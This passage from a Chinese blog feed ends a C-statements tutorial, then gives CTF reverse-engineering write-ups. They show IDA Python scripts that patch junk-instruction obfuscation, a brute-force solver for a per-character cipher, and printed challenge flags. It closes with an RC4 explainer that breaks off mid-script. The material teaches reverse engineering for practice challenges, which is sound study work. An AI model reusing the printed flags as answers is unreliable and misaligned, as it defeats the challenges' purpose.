语句或循环语句中)—换句话说,一个复合语句中的所有语句将被视为一个整体的大语句进行使用.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expr) <span class="comment">// if 语句的开始</span></span><br><span class="line">&#123; <span class="comment">// 开始块</span></span><br><span class="line">  <span class="type">int</span> n = <span class="number">1</span>; <span class="comment">// 声明</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n); <span class="comment">// 表达式语句</span></span><br><span class="line">&#125; <span class="comment">// 块结尾， if 语句结尾</span></span><br></pre></td></tr></table></figure><p>此外,一个复合语句内,会引入其自身的块作用域,此时块内部的变量将屏蔽外部同名的变量,有关<code>作用域</code>的知识将在后面进行讲解.</p></li><li><p>表达式语句</p><p><code>跟随分号的表达式</code>是一条语句.</p><p>无表达式的语句叫做<code>空语句</code>,空语句很重要,在后面讲解循环时会使用到.</p><p>典型的 C 程序中大多数语句是表达式语句，例如<code>赋值</code>或<code>函数调用</code>—例如前面说过的printf()的函数调用表达式.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>); <span class="comment">// 表达式语句</span></span><br><span class="line"><span class="type">char</span> *s;</span><br><span class="line"><span class="keyword">while</span> (*s++ != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    ; <span class="comment">// 空语句</span></span><br></pre></td></tr></table></figure></li><li><p>选择语句</p><p>选择语句根据表达式的值，选择数条语句之一执行—后面会讲解到的选择执行.</p></li><li><p>循环语句</p><p>循环语句重复执行一条语句,注意,这里将复合语句视为一条语句!</p><p>后面会讲解到的循环执行.</p></li><li><p>跳转语句</p><p>跳转语句无条件地转移控制流.</p><p>这里其实算是C保留了一点汇编的影子,C允许使用goto进行跳转.</p><p>跳转语句也有几种:</p><ol><li><a href="https://zh.cppreference.com/w/c/language/break">break</a> 语句</li><li><a href="https://zh.cppreference.com/w/c/language/continue">continue</a> 语句</li><li><a href="https://zh.cppreference.com/w/c/language/return">return</a> 语句带可选的表达式</li><li><a href="https://zh.cppreference.com/w/c/language/goto">goto</a> 语句</li></ol><p>这些语句将在后面讲解其他执行顺序时进行讲解,放在顺序执行里为时过早.</p></li></ol><p>​—WAHAHA 2023.10.13</p><br><br><p>上一篇:<a href="../2023-10-18-427f4611cc41/">C语言教程-3_2-基本输入输出</a></p><p>下一篇:<a href="../2023-09-22-22bfbdadd502">C语言教程-5-顺序执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令题型</title>
      <link href="/2023-09-23-0f806397af20/"/>
      <url>/2023-09-23-0f806397af20/</url>
      
        <content type="html"><![CDATA[<h1 id="gfctf-2021wordy"><a href="https://www.ctfer.vip/problem/880">[GFCTF] 2021wordy</a></h1><p>2023.9.23</p><p>本题关键是用脚本解决一系列的花指令(数量过多需要使用<code>IDA Python</code>来写脚本)</p><p>发现程序中有花指令jmp,将其patch为nop(0x90):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_adr = <span class="number">0x1151</span></span><br><span class="line">end_adr = <span class="number">0x3100</span></span><br><span class="line"><span class="comment"># 因为尝试patch一个后发现后面有大批量的花指令,所以编写脚本</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_adr,end_adr):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xeb</span>:</span><br><span class="line">        <span class="keyword">if</span> get_wide_byte(i+<span class="number">1</span>) == <span class="number">0xff</span>:</span><br><span class="line">            patch_byte(i,<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>然后发现是一系列putchar(),同样写脚本将输出的字符提取出来:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start_adr = <span class="number">0x1151</span></span><br><span class="line">end_adr = <span class="number">0x3100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_adr,end_adr):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xc0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(get_wide_byte(i+<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ello world!</span><br><span class="line">There are moments in life when you miss someone so much that you just want to pick them from your dreams and hug them for real! Dream what you want to dream;go where you want to go;be what you want to be,becÿause you have only one life and one chance to do all the things you want to do.</span><br><span class="line">May you have enough happiness to make you sweet,enough trials to make you strong,enough sorrow to keep you human,enough hope to make you happy? Always put yourself in others&#x27;shÿoes.If you feel that it hurts you,it probably hurts the other person, too.</span><br><span class="line"></span><br><span class="line">GFÿCTF&#123;u_are2wordy&#125;</span><br><span class="line">You find Flag, Congratulation!</span><br><span class="line">You didn&#x27;t find Flag</span><br></pre></td></tr></table></figure><h1 id="hznuctf-2023-final-虽然他送了我玫瑰花"><a href="https://www.ctfer.vip/problem/3595">[HZNUCTF 2023 final]虽然他送了我玫瑰花</a></h1><p>2023.9.28</p><h2 id="花指令patch">花指令patch</h2><p>本题的main函数有一处(还是两处;来着)花指令,同样把jz+jnz后面的脏字节patch为<code>0x90</code>,即nop指令;</p><p>然后在nop处按快捷键c识别为代码;</p><p>最后光标指示到main函数的开头,按快捷键p重新生成函数,看到(可能?)生成了一些变量的初始化代码后说明成功,此时就可以正常生成main函数的C伪代码了.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142524335.png" alt="image-20230928142524335"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142642131.png" alt="image-20230928142642131"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142712825.png" alt="image-20230928142712825"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142801458.png" alt="image-20230928142801458"></p><p>最后记得patch后要同步保存一下,这里不知道IDA怎么搞的,反正我为了防止出问题,先从patch菜单中点击保存到输入文件(原来的文件):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142930135.png" alt="image-20230928142930135" style="zoom:33%;" /><p>然后保存,最后重启IDA:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143027704.png" alt="image-20230928143027704" style="zoom:33%;" /><p>这样就完成了.</p><p>最终的main伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+0h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">100</span>]; <span class="comment">// [esp+Ch] [ebp-ECh]</span></span><br><span class="line">  __int128 v9; <span class="comment">// [esp+70h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+80h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+84h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+88h] [ebp-70h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+8Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> Arglist[<span class="number">100</span>]; <span class="comment">// [esp+90h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401020((<span class="type">char</span> *)&amp;Format, v6);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Arglist);</span><br><span class="line">  v10 = <span class="number">-171171450</span>;</span><br><span class="line">  v11 = <span class="number">-669748952</span>;</span><br><span class="line">  v12 = <span class="number">1651994351</span>;</span><br><span class="line">  v13 = <span class="number">-6</span>;</span><br><span class="line">  v9 = xmmword_402170;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Arglist) == <span class="number">29</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">      v8[i] = funcs_40117E[i % <span class="number">5u</span>](Arglist[i]);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8[v4] == *((_BYTE *)&amp;v9 + v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="number">29</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401020(<span class="string">&quot;Congratulations!!\n&quot;</span>, v7);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401020(<span class="string">&quot;try again\n&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401020(<span class="string">&quot;wwwhhhaaattt???\n&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析代码">分析代码</h2><p>很容易知道flag长度为29,我们构造一个长29的字符串备用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">29</span>;++i)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="comment">//aaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们从伪代码中发现这段关键代码,使用了一个函数指针数组对每一位进行不同的加密变换:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">      v8[i] = funcs_40117E[i % <span class="number">5u</span>](Arglist[i]);</span><br></pre></td></tr></table></figure><p>由于只有5个函数,我们直接把他们提取出来—点击<code>funcs_40117E</code>到内存,跳转到对应的五个函数,稍加修改备用:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143211657.png" alt="image-20230928143211657"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f0</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f0\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 ^ <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f1\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 + <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f2</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f2\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 - <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f3</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f3\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * (a1 &amp; <span class="number">0x7F</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f4</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f4\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 ^ ((<span class="type">unsigned</span> <span class="type">char</span>)a1 ^ (<span class="type">unsigned</span> <span class="type">char</span>)~(<span class="type">unsigned</span> <span class="type">char</span>)a1) &amp; <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> (*func_p[<span class="number">5</span>])(<span class="type">int</span> a1) = &#123;</span><br><span class="line">f0, f1, f2, f3, f4</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候就只剩下提取出v9对应的数组(IDA分析将其错误分析成一个__int128,三个int和一个char的组合了)中的加密后的flag了,我们动态调试,然后用<code>IDA Python</code>提取29个字节,这里多提取了几次,最后提取出来的没有<code>0x0</code>的才是正确的(虽然我不知道怎么回事).</p><p>貌似要在正式开始和v9比较时数据才写回内存(?)总之把断点位置从22行<code>if ( strlen(Arglist) == 29 )</code>放到后面27行的<code>while ( v8[v4] == *((_BYTE *)&amp;v9 + v4) )</code>才最后成功.</p><p>这也意味着我们动调是需要输入正确的长为29的字符串,我们已经生成好了.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143705669.png" alt="image-20230928143705669" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143717471.png" alt="image-20230928143717471" style="zoom:50%;" /><p>我们双击v9,找到其地址,写脚本导出即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143825128.png" alt="image-20230928143825128"></p><p>脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adr=<span class="number">0x0036FD68</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    temp=get_bytes(adr+i,<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(temp,byteorder=<span class="string">&#x27;little&#x27;</span>)),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(temp,end=&#x27;,&#x27;)*/</span></span><br></pre></td></tr></table></figure><p>最后把提取出来的数据进行爆破解密即可:</p><p>爆破脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f0</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 ^ <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 + <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f2</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 - <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f3</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * (a1 &amp; <span class="number">0x7F</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f4</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 ^ ((<span class="type">unsigned</span> <span class="type">char</span>)a1 ^ (<span class="type">unsigned</span> <span class="type">char</span>)~(<span class="type">unsigned</span> <span class="type">char</span>)a1) &amp; <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> str1[] = &#123;</span><br><span class="line"><span class="number">0x7f</span>, <span class="number">0x7e</span>, <span class="number">0x51</span>, <span class="number">0xce</span>, <span class="number">0xfb</span>, <span class="number">0x4e</span>, <span class="number">0x7a</span>, <span class="number">0x24</span>, <span class="number">0xe8</span>, <span class="number">0xdf</span>, <span class="number">0x59</span>, <span class="number">0x71</span>, <span class="number">0x26</span>, <span class="number">0xca</span>, <span class="number">0xe1</span>, <span class="number">0x6c</span>, <span class="number">0x86</span>, <span class="number">0x21</span>, <span class="number">0xcc</span>, <span class="number">0xf5</span>, <span class="number">0x28</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0xd8</span>, <span class="number">0xef</span>, <span class="number">0x6e</span>, <span class="number">0x77</span>, <span class="number">0x62</span>, <span class="number">0xfa</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// printf(&quot;%d&quot;,sizeof(str1) / sizeof(str1[0]));</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*func_p[<span class="number">5</span>])(<span class="type">int</span> a1) = &#123;</span><br><span class="line">f0, f1, f2, f3, f4</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">32</span>; c &lt;= <span class="number">126</span>; ++c) &#123;</span><br><span class="line"><span class="keyword">if</span> (func_p[i % <span class="number">5</span>](c) == str1[i]) &#123;</span><br><span class="line"><span class="built_in">putchar</span>(c);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">adr=0x00EFFA1C</span></span><br><span class="line"><span class="comment">for i in range(29):</span></span><br><span class="line"><span class="comment">    temp=get_bytes(adr+i,1)</span></span><br><span class="line"><span class="comment">    print(hex(int.from_bytes(temp,byteorder=&#x27;little&#x27;)),end=&#x27;,&#x27;)</span></span><br><span class="line"><span class="comment">    #print(temp,end=&#x27;,&#x27;)*/</span></span><br></pre></td></tr></table></figure><p>最终结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928144001030.png" alt="image-20230928144001030" style="zoom:50%;" /><p>结束…</p><h1 id="nssround-3-team-jump-by-jump">NSSRound#3 Team]jump_by_jump</h1><p>直接将jz和jnz下面识别出的call指令的首字节E8修改成90(nop指令),然后将后面转换出来的数据重新分析成指令,然后最后在main的开头重新生成函数即可还原函数伪代码.</p><p>问题:我的IDA莫名其妙patch为nop后,新生成的数据无法分析为数据,来回辗转好机会才成功.<code>猜测可能是重新分析成代码时,选中的数据要包含有patch出来的nop.</code></p><p>patch掉脏字节↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014252908.png" alt="image-20230925014252908" style="zoom:45%;" /><p>选中包含nop在内的那堆数据,进行analyze,然后就会生成正确的汇编代码,此时在_main_0的开头重新生成函数即可↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014609287.png" alt="image-20230925014609287" style="zoom:55%;" /><p>修复完成,此时TAB键即可生成伪代码↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014215010.png" alt="image-20230925014215010" style="zoom: 50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014904236.png" alt="image-20230925014904236" style="zoom:45%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4</title>
      <link href="/2023-09-23-fb5e5b37b475/"/>
      <url>/2023-09-23-fb5e5b37b475/</url>
      
        <content type="html"><![CDATA[<h1 id="rc4概述">RC4概述</h1><p>以下为维基百科的描述:</p><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中，<strong>RC4</strong>（来自Rivest Cipher 4的缩写）是一种<a href="https://zh.wikipedia.org/wiki/%E4%B8%B2%E6%B5%81%E5%8A%A0%E5%AF%86%E6%B3%95">串流加密法</a>，<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>长度可变。它加解密使用相同的密钥，因此也属于<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a>。RC4是<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">有线等效加密</a>（WEP）中采用的加密算法，也曾经是<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">TLS</a>可采用的算法之一。</p><p>RC4是由美国密码学家<a href="https://zh.wikipedia.org/wiki/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7%E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9">罗纳德·李维斯特</a>（Ronald Rivest）在1987年设计的。由于RC4算法存在弱点，2015年2月所发布的 <a href="https://tools.ietf.org/html/rfc7465">RFC 7465</a> 规定禁止在TLS中使用RC4加密算法[<a href="https://zh.wikipedia.org/wiki/RC4#cite_note-1">1]</a>。</p><p>RC4由<a href="https://zh.wikipedia.org/wiki/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0">伪随机数</a>生成器和<a href="https://zh.wikipedia.org/wiki/%E5%BC%82%E6%88%96">异或</a>运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个<a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">S盒</a>。S盒用来加密数据，而且在加密过程中S盒会变化。</p><p>由于<a href="https://zh.wikipedia.org/wiki/%E5%BC%82%E6%88%96">异或运算</a>的<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E5%90%88">对合性</a>，RC4加密解密使用同一套算法。</p><h1 id="运算过程">运算过程</h1><p>原理很简单，包括初始化算法（KSA）和<a href="https://baike.baidu.com/item/%E4%BC%AA%E9%9A%8F%E6%9C%BA?fromModule=lemma_inlink">伪随机</a>子密码生成算法（PRGA)两大部分</p><p>由于是异或运算,加解密<code>同操作</code>—对明文使用同一个密钥异或两次最后得到的是原文</p><h1 id="解密脚本">解密脚本</h1><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;\0&#x27;</span>  <span class="comment"># enc 中保存密文</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsFlagggg&quot;</span>  <span class="comment"># 密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成(搅乱) S-box --- KSA</span></span><br><span class="line">s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用S盒生成密钥流 --- The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"># 同时直接进行解密</span></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">    k = s_box[t]</span><br><span class="line">    res.append(<span class="built_in">chr</span>(<span 